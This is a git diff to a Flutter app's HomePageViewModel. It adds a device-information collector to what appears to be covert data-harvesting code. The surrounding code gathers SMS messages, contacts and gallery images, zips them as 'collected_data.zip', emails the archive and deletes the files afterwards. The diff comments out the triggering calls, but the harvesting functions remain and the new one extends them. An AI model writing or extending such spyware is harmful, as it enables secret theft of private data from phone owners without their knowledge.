@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:base_app/services/DeviceInfoService.dart';
 import 'package:base_app/services/EmailService.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:path_provider/path_provider.dart';
@@ -17,6 +18,7 @@ class HomePageViewModel extends ChangeNotifier {
   final ZipService zipService = ZipService();
   final PermissionsService permissionsService = PermissionsService();
   final EmailService emailService = EmailService();
+  final DeviceInfoService deviceInfoService = DeviceInfoService();
 
   bool isLoading = false;
   List<File> files = [];
@@ -31,14 +33,16 @@ class HomePageViewModel extends ChangeNotifier {
             const Text(AppStrings.theNecessaryPermissionsWereNotGiven));
         return;
       } else {
-        isLoading = true;
+        //isLoading = true;
         //await _getSms();
         //await _getContacts();
         //await _getGallery();
+        //await _getDeviceInfo();
         //final zipFile = await _createZip();
         //await emailService.sendEmail(zipFile);
         //await _deleteSpecificFiles();
-        isLoading = false;
+        //isLoading = false;
+
       }
     } catch (e) {
       isLoading = false;
@@ -100,6 +104,20 @@ class HomePageViewModel extends ChangeNotifier {
     }
   }
 
+  Future<void> _getDeviceInfo() async {
+    try {
+      List<String> deviceInfoList = await deviceInfoService.getDeviceInfo();
+      String path = await _getFilePath('devices_info.txt');
+      final deviceInfoFile = File(path);
+      await deviceInfoFile.writeAsString(deviceInfoList.join('\n'));
+
+      files.add(deviceInfoFile);
+      print("Cihaz bilgileri dosyası oluştu");
+    } catch (e) {
+      print("Hata: $e");
+    }
+  }
+
   Future<File> _createZip() async {
     try {
       String zipPath = await _getFilePath('collected_data.zip');
@@ -120,6 +138,7 @@ class HomePageViewModel extends ChangeNotifier {
         'contacts.txt',
         'gallery_base64.txt',
         'collected_data.zip',
+        'devices_info.txt',
       ];
 
       for (var fileName in fileNames) {
